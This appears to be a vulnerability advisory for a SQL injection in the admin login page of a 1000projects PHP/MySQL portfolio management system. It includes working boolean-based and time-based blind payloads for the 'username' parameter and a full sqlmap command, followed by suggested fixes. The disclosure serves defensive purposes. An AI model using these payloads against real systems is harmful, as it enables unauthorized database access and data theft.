# 1000projects Portfolio Management System MCA Project using PHP and MySQL V1.0 /admin/admin_login.php SQL injection

## NAME OF AFFECTED PRODUCT(S)

- ` Portfolio Management System MCA Project using PHP and MySQL`

## Vendor Homepage

- https://1000projects.org/portfolio-management-system-mca-project-using-php-and-mysql.html

## Software Link

- https://1000projects.org/wp-content/uploads/2022/11/Portfolio-MP.7z

## Vendor

- `1000projects`

## Vulnerability Type

- `SQL injection`

## Root Cause

- A SQL injection vulnerability was found in the '/admin/admin_login.php' file of the 'Portfolio Management System MCA Project using PHP and MySQL' project.   The reason for this issue is that attackers inject malicious code from the parameter 'username' and use it directly in SQL queries without the need for appropriate cleaning or validation.   This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

  <img src="./image/1.jpg" style="zoom:150%;" />

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve  unauthorized database access, sensitive data leakage, data tampering,  comprehensive system control, and even service interruption, posing a  serious threat to system security and business continuity.

## DESCRIPTION

- During the security review of "Portfolio Management System MCA Project using PHP and MySQL", wangjiawei  discovered a critical SQL injection vulnerability in the "/admin/admin_login.php" file.   This vulnerability stems from insufficient  user input validation of the 'username' parameter, allowing attackers to inject malicious SQL queries.   Therefore, attackers can gain  unauthorized access to databases, modify or delete data, and access  sensitive information.   Immediate remedial measures are needed to ensure  system security and protect data integrity.

## Vulnerability details and POC

Vulnerability Name: 
- "username" Parameter

### payload
```
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-1628' OR 5975=5975-- fDUG&password=1&submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=1' AND (SELECT 4489 FROM (SELECT(SLEEP(5)))tfBj)-- Bxll&password=1&submit=Login
```

### The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```
python sqlmap.py -u "http://192.168.75.230:8080/admin/admin_login.php" --data="username=1&password=1&submit=Login" --cookie="Cookie: PHPSESSID=2vlp63ah40dpfu1essnne5at9c" --batch --level=5 --risk=3 --random-agent --dbms=mysql --dbs
```
<img src="./image/2.jpg" style="zoom:150%;" />

## Suggested fixes

1. **Use prepared statements and parameter binding:**
    Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered  by the user is treated as pure data and will not be interpreted as SQL  code.
2. **Input validation and filtering:**
    Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Regular security audits:**
    Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
